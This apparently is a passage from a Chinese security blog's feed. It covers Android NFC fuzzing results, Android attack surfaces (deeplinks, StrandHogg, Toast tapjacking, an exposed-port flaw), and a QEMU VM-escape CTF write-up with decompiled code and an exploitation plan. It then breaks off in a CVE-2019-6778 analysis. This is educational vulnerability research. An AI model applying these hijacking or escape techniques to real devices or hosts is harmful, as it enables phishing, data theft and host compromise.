</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (input % <span class="number">6</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> TAG_NULL_TLV;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">     <span class="keyword">switch</span> (p_t2t-&gt;substate) &#123;</span><br><span class="line">       <span class="keyword">case</span> RW_T2T_SUBSTATE_WAIT_TLV_DETECT:</span><br><span class="line">         <span class="comment">/* Search for the tlv */</span></span><br><span class="line">        p_t2t-&gt;found_tlv = p_data[offset++];</span><br><span class="line">        p_t2t-&gt;found_tlv = num2tlv(p_data[offset++]); <span class="comment">//&lt;--- Converts to enum</span></span><br><span class="line">         <span class="keyword">switch</span> (p_t2t-&gt;found_tlv) &#123;</span><br><span class="line">           <span class="keyword">case</span> TAG_NULL_TLV: <span class="comment">/* May be used for padding. SHALL ignore this */</span></span><br><span class="line">             <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这样，uint8_t当需要枚举时，fuzzer仍可以生成fuzz范围内的数据，而不会被阻塞。</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>诚然，由于已经发现了许多漏洞，并且NFC 2型协议具有严格的限制（或多或少固定长度），当它在运行的几分钟内发现了四个OOB写入而没有输入语料库时，我感到有些惊讶。这些漏洞被披露为CVE-2020-0070/GHSL-2020-010, CVE-2020-0071/GHSL-2020-008, CVE-2020-0072/GHSL-2020-007, and CVE-2020-0073/GHSL-2020-006.。</p><p>这些都是OOB内部结构写的，ASAN（地址清理器）不会检测到。实际上，当我第一次崩溃时，这是因为其中一个错误最终覆盖了函数指针，并击中了控制流完整性（CFI）检查并崩溃了。更糟的是，libFuzzer似乎认为这是嵌套的崩溃，没有产生崩溃案例。通过引入一些手动断言，我最终能够重构测试用例。在与Antonio Morales进行了一些讨论之后，他指出，在某些情况下，ASAN无法检测到OOB写入而内部结构溢出就是其中一种情况。但是应该可以使用未定义的行为消毒器（UBSAN）来检测这些情况。因此，我接受了建议并将UBSAN边界检查包括在构建配置中：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sanitize : &#123;</span><br><span class="line">    misc_undefined: [</span><br><span class="line">        "bounds",</span><br><span class="line">    ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>然后，这将检测所有情况，而无需我的手动断言，并且在最终版本的fuzzer中使用了该情况。（请注意，未使用完整的UBSAN，因为UBSAN中的vtable检查使fuzz测试器无法使用，因为并非所有依赖项都在启用清除程序的情况下进行编译。）</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在本文中，我描述了如何为Android NFC实现fuzzer，并展示了如何将结构化fuzz合并到fuzzer中以解决各种问题。它还显示了fuzz测试如何补充手动审核工作，即使在其他研究人员进行了大量审核之后，我仍然能够发现新的错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/research/fuzzing_android_nfc&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://securitylab.github.com/resea
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>做安服时了解到的Android攻击面</title>
    <link href="https://github.com/Cracke-S-J/2020/06/26/%E5%81%9A%E5%AE%89%E6%9C%8D%E6%97%B6%E4%BA%86%E8%A7%A3%E5%88%B0%E7%9A%84Android%E6%94%BB%E5%87%BB%E9%9D%A2/"/>
    <id>https://github.com/Cracke-S-J/2020/06/26/%E5%81%9A%E5%AE%89%E6%9C%8D%E6%97%B6%E4%BA%86%E8%A7%A3%E5%88%B0%E7%9A%84Android%E6%94%BB%E5%87%BB%E9%9D%A2/</id>
    <published>2020-06-26T08:16:10.000Z</published>
    <updated>2020-06-26T09:03:39.143Z</updated>
    
    <content type="html"><![CDATA[<h2 id="deeplink"><a href="#deeplink" class="headerlink" title="deeplink"></a>deeplink</h2><p>知识点是关于Android导出组件，有<code>&lt;intent-filter&gt;</code>的组件隐式导出，有action、category、data什么的是有deeplink。</p><p>比如<code>&lt;data android:scheme=&quot;example&quot; android:host=&quot;gizmos&quot; &gt;&lt;/data&gt;</code>这种配置，<code>example://gizmos</code>和<code>http://www.example.com/gizmos</code>这两个deeplink都可以被用来启动Activity。</p><p>防护措施是<code>&lt;permission&gt;</code>，不过很多App并没有加。</p><p>利用的话要进一步逆向分析，比如可以：</p><ul><li>操纵WebView；</li><li>构造CSRF；</li><li>绕过应用锁；</li><li>打开App保护组件；</li></ul><h2 id="Strandhogg漏洞"><a href="#Strandhogg漏洞" class="headerlink" title="Strandhogg漏洞"></a>Strandhogg漏洞</h2><p>涉及到任务栈的问题。</p><p>首先理解两个属性<code>allowTaskReparenting</code>和<code>taskAffinity</code>：</p><ul><li><code>allowTaskReparenting</code> – Activity是否能从该任务转移至与其有相似性的任务；</li><li>什么是相似性？任务相关性？</li><li><code>taskAffinity</code> – 跟你设成同一个包名就跟你有相关性了；</li></ul><p>这样利用思路就来了：</p><ul><li>恶意应用造两个界面，一个是钓鱼等恶意界面，一个是正常无害界面；</li><li>先启动恶意界面紧接着启动无害界面，用户只会看到无害界面（当然有写轮眼的用户可能看到它闪了一下）；</li><li>然后打开被攻击的应用时，由于恶意界面“恶意模仿”了正常应用，强行被转移到前台，造成劫持；</li></ul><p>目前来看缓解措施是singleTask、singleInstence。</p><h2 id="Toast漏洞Tapjacking-–-CVE-2020-0014"><a href="#Toast漏洞Tapjacking-–-CVE-2020-0014" class="headerlink" title="Toast漏洞Tapjacking – CVE-2020-0014"></a>Toast漏洞Tapjacking – CVE-2020-0014</h2><p><a href="https://www.anquanke.com/post/id/201052" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201052</a></p><p>主要是可以通过反射的方式来修改Toast对象的TN对象的mParams属性，清除FLAG_NOT_TOUCHABLE选项，并且将Toast布满屏幕，且设为全透明。可以起一个service来周期性弹Toast以窃取用户信息。</p><p>看patch可以看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/services/core/java/com/android/server/wm/DisplayPolicy.java b/services/core/java/com/android/server/wm/DisplayPolicy.java</span><br><span class="line">index <span class="number">99</span>a9db3..d4a4628 <span class="number">100644</span></span><br><span class="line">--- a/services/core/java/com/android/server/wm/DisplayPolicy.java</span><br><span class="line">+++ b/services/core/java/com/android/server/wm/DisplayPolicy.java</span><br><span class="line">@@ -<span class="number">865</span>,<span class="number">6</span> +<span class="number">865</span>,<span class="number">8</span> @@</span><br><span class="line">        <span class="keyword">if</span> (canToastShowWhenLocked(callingPid)) &#123;</span><br><span class="line">                     attrs.flags |= WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;</span><br><span class="line">                 &#125;</span><br><span class="line">+                <span class="comment">// Toasts can't be clickable</span></span><br><span class="line">+                attrs.flags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>可以看到在攻击者修改flag之后又强行改回去了。</p><h2 id="虫洞"><a href="#虫洞" class="headerlink" title="虫洞"></a>虫洞</h2><p>安装百度系app后，通过adb shell连接手机，随后使用netstat会发现手机打开了40310/6259端口，并且任何IP都可以进行连接。</p><p>就尴尬的很，稍作伪造remote-addr以后连上http server，就可以通过url下达指令了。</p><p>有个downloadfile功能，可以下载恶意dex/so覆盖原有文件，就可以执行任意代码了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;deeplink&quot;&gt;&lt;a href=&quot;#deeplink&quot; class=&quot;headerlink&quot; title=&quot;deeplink&quot;&gt;&lt;/a&gt;deeplink&lt;/h2&gt;&lt;p&gt;知识点是关于Android导出组件，有&lt;code&gt;&amp;lt;intent-filter&amp;gt;
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>qemu漏洞入门学习</title>
    <link href="https://github.com/Cracke-S-J/2020/06/24/qemu%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/Cracke-S-J/2020/06/24/qemu%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-23T16:12:23.000Z</published>
    <updated>2020-06-24T04:22:03.317Z</updated>
    
    <content type="html"><![CDATA[<p>基础知识相关是在这看的：<a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">qemu-pwn-基础知识</a></p><p>入门基本只看了这四篇文章：<a href="https://www.anquanke.com/subject/id/207085" target="_blank" rel="noopener">QEMU全面漏洞学习</a></p><h2 id="QEMU-Pwn-XNUCA-2019-vexx"><a href="#QEMU-Pwn-XNUCA-2019-vexx" class="headerlink" title="QEMU-Pwn-XNUCA-2019-vexx"></a>QEMU-Pwn-XNUCA-2019-vexx</h2><p>本题是一道CTF，观察launch.sh可以看出往哪方面分析，没错就是vexx。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 -hda rootfs.ext2 -kernel bzImage -m 64M -append <span class="string">"console=ttyS0 root=/dev/sda oops=panic panic=1"</span> -L ./pc-bios -netdev user,id=mynet0 -device rtl8139,netdev=mynet0 -nographic -device vexx -snapshot</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>直接在IDA里搜vexx，逐个函数看一下，首先看<code>pci_vexx_realize</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">pci_vexx_realize</span><span class="params">(VexxState *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_full(&amp;v2-&gt;vexxdma.dma_timer, <span class="number">0L</span>L, QEMU_CLOCK_VIRTUAL, <span class="number">1000000</span>, <span class="number">0</span>, (QEMUTimerCB *)vexx_dma_timer, v2);</span><br><span class="line">    ...</span><br><span class="line">    memory_region_init_io(&amp;v2-&gt;mmio, &amp;v2-&gt;pdev.qdev.parent_obj, &amp;vexx_mmio_ops, v2, <span class="string">"vexx-mmio"</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">    memory_region_init_io(&amp;v2-&gt;cmb, &amp;v2-&gt;pdev.qdev.parent_obj, &amp;vexx_cmb_ops, v2, <span class="string">"vexx-cmb"</span>, <span class="number">0x4000</span>uLL);</span><br><span class="line">    portio_list_init(&amp;v2-&gt;port_list, &amp;v2-&gt;pdev.qdev.parent_obj, vexx_port_list, v2, <span class="string">"vexx"</span>); </span><br><span class="line">    v3 = pci_address_space_io(&amp;pdev-&gt;pdev);</span><br><span class="line">    portio_list_add(&amp;v2-&gt;port_list, v3, <span class="number">0x230</span>u);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;v2-&gt;mmio);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">1</span>, <span class="number">4u</span>, &amp;v2-&gt;cmb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到注册<code>vexx_dma_timer</code>，还有<code>vexx_mmio_ops</code>跟<code>vexx_cmb_ops</code>；在<code>vexx_mmio_ops</code>中的<code>vexx_mmio_read</code>和<code>vexx_mmio_write</code>没有发现什么华点；再看下<code>vexx_cmb_read</code>和<code>vexx_cmb_write</code>及有关代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">vexx_cmb_read</span><span class="params">(VexxState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> memorymode; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  memorymode = opaque-&gt;memorymode;</span><br><span class="line">  <span class="keyword">if</span> ( memorymode &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFF</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x100</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    LODWORD(addr) = opaque-&gt;req.offset + addr;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  ...</span><br><span class="line">LABEL_4:</span><br><span class="line">    result = *(_QWORD *)&amp;opaque-&gt;req.req_buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)addr];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vexx_cmb_write</span><span class="params">(VexxState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> memorymode; <span class="comment">// eax</span></span><br><span class="line">  hwaddr v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  memorymode = opaque-&gt;memorymode;</span><br><span class="line">  <span class="keyword">if</span> ( memorymode &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x100</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    LODWORD(addr) = opaque-&gt;req.offset + addr;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">LABEL_4:</span><br><span class="line">    *(_QWORD *)&amp;opaque-&gt;req.req_buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)addr] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// req.req_buf</span></span><br><span class="line"><span class="comment">// 00000000 VexxRequest     struc ; (sizeof=0x108, align=0x4, copyof_4574)</span></span><br><span class="line"><span class="comment">// 00000000                                         ; XREF: VexxState/r</span></span><br><span class="line"><span class="comment">// 00000000 state           dd ?</span></span><br><span class="line"><span class="comment">// 00000004 offset          dd ?</span></span><br><span class="line"><span class="comment">// 00000008 req_buf         db 256 dup(?)</span></span><br><span class="line"><span class="comment">// 00000108 VexxRequest     ends</span></span><br></pre></td></tr></table></figure><p>可以看到<code>opaque-&gt;memorymode</code>为1的时候，我们可以越界读，如果我们可以控制<code>req.offset</code>的话，这种情况下通常都是可以控制的，写也是一样，可以越界写；看下我们可以越界写什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">00000000 VexxState       struc ; (sizeof=0x1CF0, align=0x10, copyof_4575)</span><br><span class="line">00000000 pdev            PCIDevice_0 ?</span><br><span class="line">000008E0 mmio            MemoryRegion_0 ?</span><br><span class="line">000009D0 cmb             MemoryRegion_0 ?</span><br><span class="line">00000AC0 port_list       PortioList_0 ?</span><br><span class="line">00000B00 thread          QemuThread_0 ?</span><br><span class="line">00000B08 thr_mutex       QemuMutex_0 ?</span><br><span class="line">00000B38 thr_cond        QemuCond_0 ?</span><br><span class="line">00000B70 stopping        db ?</span><br><span class="line">00000B71                 db ? ; undefined</span><br><span class="line">00000B72                 db ? ; undefined</span><br><span class="line">00000B73                 db ? ; undefined</span><br><span class="line">00000B74 addr4           dd ?</span><br><span class="line">00000B78 fact            dd ?</span><br><span class="line">00000B7C status          dd ?</span><br><span class="line">00000B80 irq_status      dd ?</span><br><span class="line">00000B84 memorymode      dd ?</span><br><span class="line">00000B88 req             VexxRequest ?   //req结构体</span><br><span class="line">00000C90 vexxdma         VexxDma ?      // Vexxdma结构体</span><br><span class="line">00001CF0 VexxState       ends</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 VexxDma         struc ; (sizeof=0x1060, align=0x8, copyof_4573)</span><br><span class="line">00000000                                         ; XREF: VexxState/r</span><br><span class="line">00000000 state           dd ?</span><br><span class="line">00000004                 db ? ; undefined</span><br><span class="line">00000005                 db ? ; undefined</span><br><span class="line">00000006                 db ? ; undefined</span><br><span class="line">00000007                 db ? ; undefined</span><br><span class="line">00000008 dma             dma_state ?</span><br><span class="line">00000028 dma_timer       QEMUTimer_0 ?</span><br><span class="line">00000058 dma_buf         db 4096 dup(?)</span><br><span class="line">00001058 dma_mask        dq ?</span><br><span class="line">00001060 VexxDma         ends</span><br><span class="line">00001060</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_4571)</span><br><span class="line">00000000                                         ; XREF: VexxDma/r</span><br><span class="line">00000000 src             dq ?</span><br><span class="line">00000008 dst             dq ?</span><br><span class="line">00000010 cnt             dq ?</span><br><span class="line">00000018 cmd             dq ?</span><br><span class="line">00000020 dma_state       ends</span><br><span class="line">00000020</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 QEMUTimer_0     struc ; (sizeof=0x30, align=0x8, copyof_1099)</span><br><span class="line">00000000                                         ; XREF: VexxDma/r</span><br><span class="line">00000000 expire_time     dq ?</span><br><span class="line">00000008 timer_list      dq ?                    ; offset</span><br><span class="line">00000010 cb              dq ?                    ; offset</span><br><span class="line">00000018 opaque          dq ?                    ; offset</span><br><span class="line">00000020 next            dq ?                    ; offset</span><br><span class="line">00000028 attributes      dd ?</span><br><span class="line">0000002C scale           dd ?</span><br><span class="line">00000030 QEMUTimer_0     ends</span><br></pre></td></tr></table></figure><p>看到了<code>VexxDma</code>，其中还有<code>QEMUTimer</code>，以我浅薄的经验来看，这个<code>QEMUTimer</code>在qemu逃逸中扮演着挺好用的角色；接下来就看下我们在哪控制这个<code>req.offset</code>了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vexx_ioport_write</span><span class="params">(VexxState *opaque, <span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( addr - <span class="number">0x230</span> &lt;= <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x240</span>u:</span><br><span class="line">        opaque-&gt;req.offset = val; <span class="comment">//设置req.offset</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x250</span>u:</span><br><span class="line">        opaque-&gt;req.state = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x230</span>u:</span><br><span class="line">        opaque-&gt;memorymode = val; <span class="comment">//设置opaque-&gt;memorymode</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到了，完美。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>先调用<code>vexx_ioport_write</code>把该设置的设置好；</li><li>泄露地址；越界读取<code>QEMUTimer</code>中的<code>opaque</code>泄露堆地址；越界读取<code>QEMUTimer</code>中的<code>cb</code>泄露程序地址；</li><li>劫持eip；在<code>vexx_mmio_write</code>触发<code>timer</code>的流程中，有这样一条调用链：<code>timer_mod-&gt;timer_mod_ns-&gt;timerlist_notify-&gt;notify_cb(notify_opaque)</code>；将<code>cb</code>覆盖为system plt，将<code>cat flag</code>写入req_buf，将req_buf地址覆盖到<code>time-&gt;opaque</code>；</li></ul><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p><a href="https://github.com/ray-cp/vm-escape/blob/master/qemu-escape/xnuca-2019-vxee/exp.c">exp.c</a></p><h2 id="qemu-pwn-cve-2019-6778堆溢出漏洞分析"><a href="#qemu-pwn-cve-2019-6778堆溢出漏洞分析" class="headerlink" title="qemu-pwn-cve-2019-6778堆溢出漏洞分析"></a>qemu-pwn-cve-2019-6778堆溢出漏洞分析</h2><p>CVE-2019-6778存在于QEMU的网络模块SLiRP中。该模块中的tcp_emu()函数对端口113(Identification protocol)的数据进行处理时，没有进行有效的数据验证，导致堆溢出。</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>先看这里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">tcp_emu(struct socket *so, struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(so-&gt;so_emu) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, i;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">      ...</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> = &amp;<span class="title">so</span>-&gt;<span class="title">so_rcv</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</span><br><span class="line">            so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">            so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br><span class="line">            m-&gt;m_data[m-&gt;m_len] = <span class="number">0</span>; <span class="comment">/* NULL terminate */</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">'r'</span>) || <span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">'n'</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">sscanf</span>(so_rcv-&gt;sb_data, <span class="string">"%u%*[ ,]%u"</span>, &amp;n1, &amp;n2) == <span class="number">2</span>) &#123;</span><br><span class="line">                ...</span><br><span class="line">                                so_rcv-&gt;sb_cc = <span class="built_in">snprintf</span>(so_rcv-&gt;sb_data,</span><br><span class="line">                                                         so_rcv-&gt;sb_datalen,</span><br><span class="line">                                                         <span class="string">"%d,%drn"</span>, n1, n2);</span><br><span class="line">                so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;</span><br><span class="line">                so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;</span><br><span class="line">            &#125;</span><br><span class="line">            m_free(m);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">    <span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>    <span class="title">mbuf</span> *<span class="title">m_next</span>;</span>        <span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>    <span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>    <span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span>    <span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>    <span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span>    <span class="comment">/* Flags aren't used in the output queue */</span></span><br><span class="line">    <span class="keyword">int</span>    